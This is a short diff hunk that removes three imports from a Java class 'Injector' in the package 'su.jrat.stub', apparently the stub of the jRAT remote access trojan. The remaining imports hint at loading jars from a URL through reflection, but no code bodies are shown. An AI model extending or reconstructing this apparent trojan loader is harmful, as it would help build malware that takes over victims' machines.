@@ -3,15 +3,11 @@ package su.jrat.stub;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.DataInputStream;
-import java.io.FileOutputStream;
 import java.io.InputStream;
-import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.net.URL;
 import java.net.URLConnection;
 import java.util.jar.JarInputStream;
-
-import su.jrat.common.io.FileIO;
 
 public class Injector {
 	
